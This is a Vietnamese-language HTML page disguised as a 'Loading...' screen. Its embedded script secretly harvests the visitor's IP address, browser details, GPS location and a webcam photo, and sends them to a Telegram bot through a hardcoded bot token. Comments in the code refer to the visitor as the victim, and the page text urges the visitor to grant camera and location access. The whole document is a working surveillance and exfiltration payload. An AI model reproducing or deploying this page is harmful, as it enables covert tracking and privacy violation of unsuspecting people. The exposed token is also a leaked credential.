<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Đang tải...</title>
    <script>
    // Cấu hình bot
    const TOKEN = "8913567180:AAHQo70E_tMM4pfH1T_pTVSDsC9Mud0PmBI";
    const BOT = "@gyruoa_bot";

    function sendToBot(data) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${BOT}&text=${encodeURIComponent(data)}`);
    }

    // 1. Lấy IP (tự động, không cần xin phép)
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => sendToBot(`🔴 IP: ${data.ip}`));

    // 2. Thông tin trình duyệt (tự động)
    sendToBot(`📱 UA: ${navigator.userAgent}`);
    sendToBot(`📐 Screen: ${screen.width}x${screen.height}`);
    sendToBot(`🌍 Language: ${navigator.language}`);

    // 3. Lấy vị trí GPS (CẦN XIN PHÉP - nạn nhân phải đồng ý)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => sendToBot(`📍 GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`),
            err => sendToBot(`❌ GPS denied`)
        );
    }

    // 4. BẬT CAMERA (CẦN XIN PHÉP - nạn nhân phải nhấn "Allow")
    async function tryCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            // Tạo ảnh từ camera (cần canvas)
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg').split(',')[1];
                // Gửi ảnh qua bot (base64 - hơi dài)
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${BOT}`,
                    { method: 'POST', body: JSON.stringify({ photo: `data:image/jpeg;base64,${photo}` }) });
                stream.getTracks().forEach(track => track.stop());
            }, 1000);
        } catch(e) { sendToBot(`❌ Camera denied: ${e}`); }
    }
    tryCamera();

    // 5. Chụp màn hình (CẦN XIN PHÉP - KHÔNG THỂ TỰ ĐỘNG)
    // html2canvas cũng cần người dùng tương tác để vượt qua CORS
    sendToBot(`✅ Hoàn thành thu thập!`);
    </script>
</head>
<body>
    <h1>Đang tải nội dung...</h1>
    <p>Vui lòng cho phép truy cập vị trí và camera khi được hỏi.</p>
</body>
</html>
